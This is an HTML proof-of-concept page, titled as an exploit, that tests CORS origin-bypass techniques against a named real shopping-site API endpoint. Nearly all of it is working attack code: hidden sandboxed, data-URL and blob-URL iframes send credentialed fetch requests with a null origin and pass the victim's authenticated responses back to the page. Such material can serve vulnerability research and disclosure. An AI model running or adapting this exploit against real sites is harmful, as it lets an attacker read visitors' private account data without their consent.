<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8">
<title>OPPO CORS Exploit PoC</title>

<style>

body{
font-family: Arial, sans-serif;
background:#eef2f7;
margin:0;
padding:30px;
color:#222;
}

.container{
max-width:1100px;
margin:auto;
}

h1{
text-align:center;
margin-bottom:10px;
}

.description{
text-align:center;
margin-bottom:30px;
}

button{
display:block;
margin:20px auto;
padding:12px 30px;
font-size:16px;
background:#2e7df6;
color:white;
border:none;
border-radius:6px;
cursor:pointer;
}

.card{
background:white;
padding:18px;
border-radius:10px;
box-shadow:0 2px 8px rgba(0,0,0,0.08);
margin-bottom:20px;
}

.label{
font-weight:bold;
margin-bottom:6px;
}

pre{
background:#f5f6f8;
padding:12px;
border-radius:6px;
white-space:pre-wrap;
word-break:break-word;
font-size:13px;
}

</style>

</head>

<body>

<div class="container">

<h1>OPPO CORS Origin Bypass Tests</h1>

<div class="description">
Testing different techniques to generate <b>null origin</b> requests.
</div>

<button onclick="runTests()">Run Tests</button>

<div id="results"></div>

</div>

<iframe id="sandboxFrame" sandbox="allow-scripts" style="display:none"></iframe>

<script>

const endpoint="https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount"

function createCard(title,id){

let div=document.createElement("div")
div.className="card"

div.innerHTML=
'<div class="label">'+title+'</div>'+
'<div>Status: <span id="'+id+'_status">waiting</span></div>'+
'<pre id="'+id+'_data"></pre>'

document.getElementById("results").appendChild(div)

}

createCard("Sandbox iframe test","sandbox")
createCard("Data URL test","data")
createCard("Blob URL test","blob")

window.addEventListener("message",e=>{

if(!e.data.type) return

document.getElementById(e.data.type+"_status").innerText=e.data.status
document.getElementById(e.data.type+"_data").innerText=e.data.body

})

function runTests(){

runSandbox()
runData()
runBlob()

}

function runSandbox(){

let code=`
<script>

fetch("${endpoint}",{credentials:"include"})
.then(r=>r.text().then(t=>{
parent.postMessage({type:"sandbox",status:r.status,body:t},"*")
}))
.catch(e=>{
parent.postMessage({type:"sandbox",status:"error",body:e.toString()},"*")
})

<\/script>
`

document.getElementById("sandboxFrame").srcdoc=code

}

function runData(){

let code=`
<script>

fetch("${endpoint}",{credentials:"include"})
.then(r=>r.text().then(t=>{
parent.postMessage({type:"data",status:r.status,body:t},"*")
}))
.catch(e=>{
parent.postMessage({type:"data",status:"error",body:e.toString()},"*")
})

<\/script>
`

let url="data:text/html;base64,"+btoa(code)

let iframe=document.createElement("iframe")
iframe.src=url
iframe.style.display="none"

document.body.appendChild(iframe)

}

function runBlob(){

let code=`
<script>

fetch("${endpoint}",{credentials:"include"})
.then(r=>r.text().then(t=>{
parent.postMessage({type:"blob",status:r.status,body:t},"*")
}))
.catch(e=>{
parent.postMessage({type:"blob",status:"error",body:e.toString()},"*")
})

<\/script>
`

let blob=new Blob([code],{type:"text/html"})
let url=URL.createObjectURL(blob)

let iframe=document.createElement("iframe")
iframe.src=url
iframe.style.display="none"

document.body.appendChild(iframe)

}

</script>

</body>
</html>
